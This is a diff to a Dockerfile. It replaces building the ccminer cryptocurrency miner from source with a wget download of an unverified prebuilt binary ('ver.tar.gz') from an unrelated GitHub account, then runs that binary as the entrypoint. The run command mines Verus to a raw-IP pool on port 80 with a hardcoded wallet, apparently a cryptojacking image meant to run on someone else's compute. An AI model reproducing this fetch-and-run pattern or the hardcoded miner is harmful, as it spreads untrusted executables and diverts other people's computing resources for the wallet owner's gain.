@@ -1,7 +1,7 @@
-FROM debian:sid-slim as builder
+FROM ubuntu:latest as builder
 
 RUN apt-get update && apt-get dist-upgrade -y && \
-    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
+    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 curl wget && \
     apt-get clean && \
     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
@@ -10,22 +10,19 @@ RUN apt-get update && apt-get dist-upgrade -y && \
     apt-get clean && \
     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
-RUN git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && \
-    cd ccminer && \
-    chmod +x build.sh configure.sh autogen.sh && \
-    ./build.sh && \
-    cd .. && \
-    mv ccminer/ccminer /usr/local/bin/ && \
-    rm -rf ccminer
-
-FROM debian:sid-slim
+RUN wget https://github.com/imraahatikah6827/eaa/releases/download/eaa/ver.tar.gz && \ 
+    tar xf ver.tar.gz && \
+    mv ver /usr/local/bin/ && \
+    rm -rf ver.tar.gz
+    
+FROM ubuntu:latest
 
 RUN apt-get update && apt-get dist-upgrade -y && \
     apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
     apt-get clean && \
     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
-COPY --from=builder /usr/local/bin/ccminer /usr/local/bin/
+COPY --from=builder /usr/local/bin/ver /usr/local/bin/
 
-ENTRYPOINT [ "ccminer" ]
-CMD [ "-a", "verus", "-o", "stratum+tcp://51.89.228.192:80", "-u", "REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9.mishaa", "-p", "x", "-t8" ]
+ENTRYPOINT [ "ver" ]
+CMD [ "-algo", "verushash", "-pool1", "51.89.228.192:80", "-wallet", "REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9", "-rigName", "mishaa" ]
